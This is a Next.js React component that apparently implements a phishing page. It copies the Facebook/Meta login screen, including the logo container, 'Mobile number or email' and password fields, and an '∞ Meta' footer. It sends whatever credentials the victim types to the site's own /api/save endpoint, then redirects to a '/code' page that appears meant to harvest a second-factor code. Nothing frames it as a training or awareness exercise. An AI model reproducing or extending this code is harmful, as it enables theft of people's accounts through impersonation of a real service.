"use client";
import { useRouter } from "next/navigation";
import { useState } from "react";

export default function Home() {
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const router = useRouter();

  const submit = async (e) => {
    e.preventDefault();

    await fetch("/api/save", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ identifier, password }),
    });
    router.push("/code");
  };

  return (
    <div className="fb-container">
      <div className="fb-logo"></div>
      <div className="mdku">
        <form className="fb-form" onSubmit={submit}>
          <input
            className="fb-input"
            placeholder="Mobile number or email"
            value={identifier}
            onChange={(e) => setIdentifier(e.target.value)}
          />

          <input
            type="password"
            className="fb-input"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />

          <button className="fb-login-btn">Log in</button>

          <div className="fb-forgot">Forgot password?</div>
        </form>
      </div>
      <button className="fb-create-btn">Create new account</button>

      <div className="fb-meta">∞ Meta</div>
    </div>
  );
}
